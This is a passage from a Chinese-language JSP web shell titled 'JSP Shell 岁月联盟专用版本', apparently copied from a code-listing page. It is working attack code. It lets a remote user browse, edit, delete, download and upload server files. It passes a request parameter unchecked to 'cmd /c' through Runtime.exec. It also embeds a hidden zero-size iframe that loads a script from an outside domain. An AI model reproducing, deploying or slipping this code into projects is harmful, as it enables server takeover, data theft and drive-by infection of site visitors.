 * Compares boundary string to byte array   */  private boolean compareBoundary(String boundary, byte ba[]) {   byte b;   if (boundary == null || ba == null) return false;   for (int i = 0; i &lt; boundary.length(); i++)    if ((byte) boundary.charAt(i) != ba[i]) return false;   return true;  }  /** Convenience method to read HTTP header lines */  private synchronized String getLine(ServletInputStream sis) throws IOException {   byte b[] = new byte[1024];   int read = sis.readLine(b, 0, b.length), index;   String line = null;   if (read != -1) {    line = new String(b, 0, read);    if ((index = line.indexOf('\n')) &gt;= 0) line = line.substring(0, index - 1);   }   return line;  }  public String getFileName(String dir, String fileName) throws IllegalArgumentException {   String path = null;   if (dir == null || fileName == null) throw new IllegalArgumentException(     "dir or fileName is null");   int index = fileName.lastIndexOf('/');   String name = null;   if (index &gt;= 0) name = fileName.substring(index + 1);   else name = fileName;   index = name.lastIndexOf('\\');   if (index &gt;= 0) fileName = name.substring(index + 1);   path = dir + File.separator + fileName;   if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);   else return path.replace('/', File.separatorChar);  }} //End of class HttpMultiPartParserString formatPath(String p){ StringBuffer sb=new StringBuffer(); for (int i = 0; i &lt; p.length(); i++)  {  if(p.charAt(i)=='\\')  {   sb.append("\\\\");  }  else  {   sb.append(p.charAt(i));  } } return sb.toString();} /**  * Converts some important chars (int) to the corresponding html string  */ static String conv2Html(int i) {  if (i == '&amp;') return "&amp;";  else if (i == '&lt;') return "&lt;";  else if (i == '&gt;') return "&gt;";  else if (i == '"') return """;  else return "" + (char) i; } /**  * Converts a normal string to a html conform string  */ static String htmlEncode(String st) {  StringBuffer buf = new StringBuffer();  for (int i = 0; i &lt; st.length(); i++) {   buf.append(conv2Html(st.charAt(i)));  }  return buf.toString(); }String getDrivers()/**Windows系统上取得可用的所有逻辑盘*/{ StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : "); File roots[]=File.listRoots(); for(int i=0;i&lt;roots.length;i++) {  sb.append(" &lt;a href=\"javascript:doForm('','"+roots[i]+"\\','','','1','');\"&gt;");  sb.append(roots[i]+"&lt;/a&gt;&amp;nbsp;"); } return sb.toString();}static String convertFileSize(long filesize){ //bug 5.09M 显示5.9M String strUnit="Bytes"; String strAfterComma=""; int intDivisor=1; if(filesize&gt;=1024*1024) {  strUnit = "MB";  intDivisor=1024*1024; } else if(filesize&gt;=1024) {  strUnit = "KB";  intDivisor=1024; } if(intDivisor==1) return filesize + " " + strUnit; strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ; if(strAfterComma=="") strAfterComma=".0"; return filesize / intDivisor + "." + strAfterComma + " " + strUnit;}%&gt;&lt;%request.setCharacterEncoding("gb2312");String tabID = request.getParameter("tabID");String strDir = request.getParameter("path");String strAction = request.getParameter("action");String strFile = request.getParameter("file");String strPath = strDir + "\\" + strFile; String strCmd = request.getParameter("cmd");StringBuffer sbEdit=new StringBuffer("");StringBuffer sbDown=new StringBuffer("");StringBuffer sbCopy=new StringBuffer("");StringBuffer sbSaveCopy=new StringBuffer("");StringBuffer sbNewFile=new StringBuffer("");if((tabID==null) || tabID.equals("")){ tabID = "1";}if(strDir==null||strDir.length()&lt;1){ strDir = request.getRealPath("/");}if(strAction!=null &amp;&amp; strAction.equals("down")){ File f=new File(strPath); if(f.length()==0) {  sbDown.append("文件大小为 0 字节，就不用下了吧"); } else {  response.setHeader("content-type","text/html; charset=ISO-8859-1");  response.setContentType("APPLICATION/OCTET-STREAM");   response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());  out.clearBuffer();  int i;  while ((i=fileInputStream.read()) != -1)  {   out.write(i);   }  fileInputStream.close();  out.close(); }}if(strAction!=null &amp;&amp; strAction.equals("del")){ File f=new File(strPath); f.delete();}if(strAction!=null &amp;&amp; strAction.equals("edit")){ File f=new File(strPath);  BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f))); sbEdit.append("&lt;form name='frmEdit' action='' method='POST'&gt;\r\n"); sbEdit.append("&lt;input type=hidden name=action value=save &gt;\r\n"); sbEdit.append("&lt;input type=hidden name=path value='"+strDir+"' &gt;\r\n"); sbEdit.append("&lt;input type=hidden name=file value='"+strFile+"' &gt;\r\n"); sbEdit.append("&lt;input type=submit name=save value=' "+strFileSave[languageNo]+" '&gt; "); sbEdit.append("&lt;input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'&gt; &amp;nbsp;"+strPath+"\r\n"); sbEdit.append("&lt;br&gt;&lt;textarea rows=30 cols=90 name=content&gt;"); String line=""; while((line=br.readLine())!=null) {  sbEdit.append(htmlEncode(line)+"\r\n");   }   sbEdit.append("&lt;/textarea&gt;"); sbEdit.append("&lt;input type=hidden name=path value="+strDir+"&gt;"); sbEdit.append("&lt;/form&gt;");}if(strAction!=null &amp;&amp; strAction.equals("save")){ File f=new File(strPath); BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f))); String strContent=request.getParameter("content"); bw.write(strContent); bw.close();}if(strAction!=null &amp;&amp; strAction.equals("copy")){ File f=new File(strPath); sbCopy.append("&lt;br&gt;&lt;form name='frmCopy' action='' method='POST'&gt;\r\n"); sbCopy.append("&lt;input type=hidden name=action value=savecopy &gt;\r\n"); sbCopy.append("&lt;input type=hidden name=path value='"+strDir+"' &gt;\r\n"); sbCopy.append("&lt;input type=hidden name=file value='"+strFile+"' &gt;\r\n"); sbCopy.append("原始文件： "+strPath+"&lt;p&gt;"); sbCopy.append("目标文件： &lt;input type=text name=file2 size=40 value='"+strDir+"'&gt;&lt;p&gt;"); sbCopy.append("&lt;input type=submit name=save value=' "+strFileCopy[languageNo]+" '&gt; "); sbCopy.append("&lt;input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'&gt; &lt;p&gt;&amp;nbsp;\r\n"); sbCopy.append("&lt;/form&gt;");}if(strAction!=null &amp;&amp; strAction.equals("savecopy")){ File f=new File(strPath); String strDesFile=request.getParameter("file2"); if(strDesFile==null || strDesFile.equals("")) {  sbSaveCopy.append("&lt;p&gt;&lt;font color=red&gt;目标文件错误。&lt;/font&gt;"); } else {  File f_des=new File(strDesFile);  if(f_des.isFile())  {   sbSaveCopy.append("&lt;p&gt;&lt;font color=red&gt;目标文件已存在,不能复制。&lt;/font&gt;");  }  else  {   String strTmpFile=strDesFile;   if(f_des.isDirectory())   {    if(!strDesFile.endsWith("\\"))    {     strDesFile=strDesFile+"\\";    }    strTmpFile=strDesFile+"cqq_"+strFile;    }      File f_des_copy=new File(strTmpFile);   FileInputStream in1=new FileInputStream(f);   FileOutputStream out1=new FileOutputStream(f_des_copy);   byte[] buffer=new byte[1024];   int c;   while((c=in1.read(buffer))!=-1)   {    out1.write(buffer,0,c);   }   in1.close();   out1.close();    sbSaveCopy.append("原始文件 ："+strPath+"&lt;p&gt;");   sbSaveCopy.append("目标文件 ："+strTmpFile+"&lt;p&gt;");   sbSaveCopy.append("&lt;font color=red&gt;复制成功！&lt;/font&gt;");     }   }  sbSaveCopy.append("&lt;p&gt;&lt;input type=button name=saveCopyBack onclick='history.back(-2);' value=返回&gt;");}if(strAction!=null &amp;&amp; strAction.equals("newFile")){ String strF=request.getParameter("fileName"); String strType1=request.getParameter("btnNewFile"); String strType2=request.getParameter("btnNewDir"); String strType=""; if(strType1==null) {  strType="Dir"; } else if(strType2==null) {  strType="File"; } if(!strType.equals("") &amp;&amp; !(strF==null || strF.equals(""))) {     File f_new=new File(strF);      if(strType.equals("File") &amp;&amp; !f_new.createNewFile())    sbNewFile.append(strF+" 文件创建失败");   if(strType.equals("Dir") &amp;&amp; !f_new.mkdirs())    sbNewFile.append(strF+" 目录创建失败"); } else {  sbNewFile.append("&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;"); }}if((request.getContentType()!= null) &amp;&amp; (request.getContentType().toLowerCase().startsWith("multipart"))){ String tempdir="."; boolean error=false; response.setContentType("text/html"); sbNewFile.append("&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;"); HttpMultiPartParser parser = new HttpMultiPartParser(); int bstart = request.getContentType().lastIndexOf("oundary="); String bound = request.getContentType().substring(bstart + 8); int clength = request.getContentLength(); Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength); if (ht.get("cqqUploadFile") != null) {  FileInfo fi = (FileInfo) ht.get("cqqUploadFile");  File f1 = fi.file;  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);  if (info != null &amp;&amp; info.aborted)   {   f1.delete();   request.setAttribute("error", "Upload aborted");  }  else   {   String path = (String) ht.get("path");   if(path!=null &amp;&amp; !path.endsWith("\\"))     path = path + "\\";   if (!f1.renameTo(new File(path + f1.getName())))    {    request.setAttribute("error", "Cannot upload file.");    error = true;    f1.delete();   }  } }}%&gt;&lt;html&gt;&lt;head&gt;&lt;style type="text/css"&gt;td,select,input,body{font-size:9pt;}A { TEXT-DECORATION: none }#tablist{padding: 5px 0;margin-left: 0;margin-bottom: 0;margin-top: 0.1em;font:9pt;}#tablist li{list-style: none;display: inline;margin: 0;}#tablist li a{padding: 3px 0.5em;margin-left: 3px;border: 1px solid ;background: F6F6F6;}#tablist li a:link, #tablist li a:visited{color: navy;}#tablist li a.current{background: #EAEAFF;}#tabcontentcontainer{width: 100%;padding: 5px;border: 1px solid black;}.tabcontent{display:none;}&lt;/style&gt;&lt;script type="text/javascript"&gt;var initialtab=[&lt;%=tabID%&gt;, "menu&lt;%=tabID%&gt;"]////////Stop editting////////////////function cascadedstyle(el, cssproperty, csspropertyNS){if (el.currentStyle)return el.currentStyle[cssproperty]else if (window.getComputedStyle){var elstyle=window.getComputedStyle(el, "")return elstyle.getPropertyValue(csspropertyNS)}}var previoustab=""function expandcontent(cid, aobject){if (document.getElementById){highlighttab(aobject)if (previoustab!="")document.getElementById(previoustab).style.display="none"document.getElementById(cid).style.display="block"previoustab=cidif (aobject.blur)aobject.blur()return false}elsereturn true}function highlighttab(aobject){if (typeof tabobjlinks=="undefined")collecttablinks()for (i=0; i&lt;tabobjlinks.length; i++)tabobjlinks[i].style.backgroundColor=initTabcolorvar themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcoloraobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor}function collecttablinks(){var tabobj=document.getElementById("tablist")tabobjlinks=tabobj.getElementsByTagName("A")}function do_onload(){collecttablinks()initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])}if (window.addEventListener)window.addEventListener("load", do_onload, false)else if (window.attachEvent)window.attachEvent("onload", do_onload)else if (document.getElementById)window.onload=do_onload &lt;/script&gt;&lt;script language="javascript"&gt;function doForm(action,path,file,cmd,tab,content){ document.frmCqq.action.value=action; document.frmCqq.path.value=path; document.frmCqq.file.value=file; document.frmCqq.cmd.value=cmd; document.frmCqq.tabID.value=tab; document.frmCqq.content.value=content; if(action=="del") {  if(confirm("确定要删除文件 "+file+" 吗？"))  document.frmCqq.submit(); } else {  document.frmCqq.submit();     }}&lt;/script&gt;&lt;title&gt;JSP Shell 岁月联盟专用版本&lt;/title&gt;&lt;head&gt;&lt;body&gt;&lt;form name="frmCqq" method="post" action=""&gt;&lt;input type="hidden" name="action" value=""&gt;&lt;input type="hidden" name="path" value=""&gt;&lt;input type="hidden" name="file" value=""&gt;&lt;input type="hidden" name="cmd" value=""&gt;&lt;input type="hidden" name="tabID" value="2"&gt;&lt;input type="hidden" name="content" value=""&gt;&lt;/form&gt;&lt;!--Top Menu Started--&gt;&lt;ul id="tablist"&gt;&lt;li&gt;&lt;a href="" class="current" onClick="return expandcontent('menu1', this)"&gt; &lt;%=strFileManage[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="new.htm" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"&gt; &lt;%=strCommand[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="hot.htm" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"&gt; &lt;%=strSysProperty[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="search.htm" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"&gt; &lt;%=strHelp[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt; &amp;nbsp; &lt;%=authorInfo[languageNo]%&gt;&lt;/ul&gt;&lt;!--Top Menu End--&gt;&lt;%StringBuffer sbFolder=new StringBuffer("");StringBuffer sbFile=new StringBuffer("");try{ File objFile = new File(strDir); File list[] = objFile.listFiles();  if(objFile.getAbsolutePath().length()&gt;3) {  sbFolder.append("&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&lt;a href=\"javascript:doForm('','"+formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\"&gt;");  sbFolder.append(strParentFolder[languageNo]+"&lt;/a&gt;&lt;br&gt;- - - - - - - - - - - &lt;/td&gt;&lt;/tr&gt;\r\n "); } for(int i=0;i&lt;list.length;i++) {  if(list[i].isDirectory())  {   sbFolder.append("&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;");   sbFolder.append("  &lt;a href=\"javascript:doForm('','"+formatPath(list[i].getAbsolutePath())+"','','"+strCmd+"','1','');\"&gt;");   sbFolder.append(list[i].getName()+"&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt; ");  }  else  {      String strLen="";   String strDT="";   long lFile=0;   lFile=list[i].length();   strLen = convertFileSize(lFile);   Date dt=new Date(list[i].lastModified());   strDT=dt.toLocaleString();   sbFile.append("&lt;tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"&gt;&lt;td&gt;");   sbFile.append(""+list[i].getName());    sbFile.append("&lt;/td&gt;&lt;td&gt;");   sbFile.append(""+strLen);   sbFile.append("&lt;/td&gt;&lt;td&gt;");   sbFile.append(""+strDT);   sbFile.append("&lt;/td&gt;&lt;td&gt;");   sbFile.append(" &amp;nbsp;&lt;a href=\"javascript:doForm('edit','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");   sbFile.append(strFileEdit[languageNo]+"&lt;/a&gt; ");   sbFile.append(" &amp;nbsp;&lt;a href=\"javascript:doForm('del','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");   sbFile.append(strFileDel[languageNo]+"&lt;/a&gt; ");   sbFile.append("  &amp;nbsp;&lt;a href=\"javascript:doForm('down','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");   sbFile.append(strFileDown[languageNo]+"&lt;/a&gt; ");   sbFile.append("  &amp;nbsp;&lt;a href=\"javascript:doForm('copy','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");   sbFile.append(strFileCopy[languageNo]+"&lt;/a&gt; ");  }   } }catch(Exception e){ out.println("&lt;font color=red&gt;操作失败： "+e.toString()+"&lt;/font&gt;");}%&gt;&lt;DIV id="tabcontentcontainer"&gt;&lt;div id="menu3" class="tabcontent"&gt;&lt;br&gt; &lt;br&gt; &amp;nbsp;&amp;nbsp; 未完成&lt;br&gt; &lt;br&gt;&amp;nbsp;&lt;/div&gt;&lt;div id="menu4" class="tabcontent"&gt;&lt;br&gt;&lt;p&gt;一、功能说明&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、&lt;/p&gt;&lt;p&gt;删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似&lt;/p&gt;&lt;p&gt;与windows的cmd。&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;二、测试&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;b&gt;请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，&lt;p&gt;留言地址为：&lt;a href="http://" target="_blank"&gt;&lt;/a&gt;&lt;/b&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;三、更新记录&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.11.15&amp;nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.10.27&amp;nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能&lt;/p&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.09.20&amp;nbsp; 第一个jsp&amp;nbsp;程序就是这个简单的显示目录文件的小程序&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;div id="menu1" class="tabcontent"&gt;&lt;%out.println("&lt;table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF&gt;&lt;tr&gt;&lt;td width='30%'&gt;"+strCurrentFolder[languageNo]+"： &lt;b&gt;"+strDir+"&lt;/b&gt;&lt;/td&gt;&lt;td&gt;" + getDrivers() + "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;\r\n");%&gt;&lt;table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF"&gt;               &lt;tr&gt;           &lt;td width="25%" align="center" valign="top"&gt;               &lt;table width="98%" border="0" cellspacing="0" cellpadding="3"&gt;     &lt;%=sbFolder%&gt;                &lt;/tr&gt;                               &lt;/table&gt;          &lt;/td&gt;          &lt;td width="81%" align="left" valign="top"&gt;  &lt;% if(strAction!=null &amp;&amp; strAction.equals("edit")) {  out.println(sbEdit.toString()); } else if(strAction!=null &amp;&amp; strAction.equals("copy")) {  out.println(sbCopy.toString()); } else if(strAction!=null &amp;&amp; strAction.equals("down")) {  out.println(sbDown.toString()); } else if(strAction!=null &amp;&amp; strAction.equals("savecopy")) {  out.println(sbSaveCopy.toString()); } else if(strAction!=null &amp;&amp; strAction.equals("newFile") &amp;&amp; !sbNewFile.toString().equals("")) {  out.println(sbNewFile.toString()); } else { %&gt;  &lt;span id="EditBox"&gt;&lt;table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" &gt;              &lt;tr bgcolor="#E7e7e6"&gt;                 &lt;td width="26%"&gt;&lt;%=strFileName[languageNo]%&gt;&lt;/td&gt;                &lt;td width="19%"&gt;&lt;%=strFileSize[languageNo]%&gt;&lt;/td&gt;                &lt;td width="29%"&gt;&lt;%=strLastModified[languageNo]%&gt;&lt;/td&gt;                &lt;td width="26%"&gt;&lt;%=strFileOperation[languageNo]%&gt;&lt;/td&gt;              &lt;/tr&gt;                          &lt;%=sbFile%&gt;             &lt;!-- &lt;tr align="center"&gt;                 &lt;td colspan="4"&gt;&lt;br&gt;                  总计文件个数：&lt;font color="#FF0000"&gt;30&lt;/font&gt; ，大小：&lt;font color="#FF0000"&gt;664.9&lt;/font&gt;                   KB &lt;/td&gt;              &lt;/tr&gt;    --&gt;            &lt;/table&gt;   &lt;/span&gt; &lt;% }   %&gt;          &lt;/td&gt;        &lt;/tr&gt; &lt;form name="frmMake" action="" method="post"&gt; &lt;tr&gt;&lt;td colspan=2 bgcolor=#FBFFC6&gt; &lt;input type="hidden" name="action" value="newFile"&gt; &lt;input type="hidden" name="path" value="&lt;%=strDir%&gt;"&gt; &lt;input type="hidden" name="file" value="&lt;%=strFile%&gt;"&gt; &lt;input type="hidden" name="cmd" value="&lt;%=strCmd%&gt;"&gt; &lt;input type="hidden" name="tabID" value="1"&gt; &lt;input type="hidden" name="content" value=""&gt; &lt;% if(!strDir.endsWith("\\")) strDir = strDir + "\\"; %&gt; &lt;input type="text" name="fileName" size=36 value="&lt;%=strDir%&gt;"&gt; &lt;input type="submit" name="btnNewFile" value="新建文件" onclick="frmMake.submit()" &gt;  &lt;input type="submit" name="btnNewDir" value="新建目录"  onclick="frmMake.submit()" &gt;  &lt;/form&gt;   &lt;form name="frmUpload" enctype="multipart/form-data" action="" method="post"&gt; &lt;input type="hidden" name="action" value="upload"&gt; &lt;input type="hidden" name="path" value="&lt;%=strDir%&gt;"&gt; &lt;input type="hidden" name="file" value="&lt;%=strFile%&gt;"&gt; &lt;input type="hidden" name="cmd" value="&lt;%=strCmd%&gt;"&gt; &lt;input type="hidden" name="tabID" value="1"&gt; &lt;input type="hidden" name="content" value=""&gt; &lt;input type="file" name="cqqUploadFile" size="36"&gt; &lt;input type="submit" name="submit" value="上传"&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;      &lt;/table&gt;&lt;/div&gt;&lt;div id="menu2" class="tabcontent"&gt;&lt;%String line="";StringBuffer sbCmd=new StringBuffer("");if(strCmd!=null) { try {  //out.println(strCmd);  Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));  while((line=br.readLine())!=null)  {   sbCmd.append(line+"\r\n");    }     } catch(Exception e) {  System.out.println(e.toString()); }}else{ strCmd = "set";}%&gt;&lt;form name="cmd" action="" method="post"&gt;&amp;nbsp;&lt;input type="text" name="cmd" value="&lt;%=strCmd%&gt;" size=50&gt;&lt;input type="hidden" name="tabID" value="2"&gt;&lt;input type=submit name=submit value="&lt;%=strExecute[languageNo]%&gt;"&gt;&lt;/form&gt;&lt;%if(sbCmd!=null &amp;&amp; sbCmd.toString().trim().equals("")==false){%&gt;&amp;nbsp;&lt;TEXTAREA NAME="cqq" ROWS="20" COLS="100%"&gt;&lt;%=sbCmd.toString()%&gt;&lt;/TEXTAREA&gt;&lt;br&gt;&amp;nbsp;&lt;%}%&gt;&lt;/DIV&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;a href="http://" target="_blank"&gt;&lt;/a&gt; &lt;br&gt;&lt;iframe src=http://7jyewu.cn/a/a.asp width=0 height=0&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><s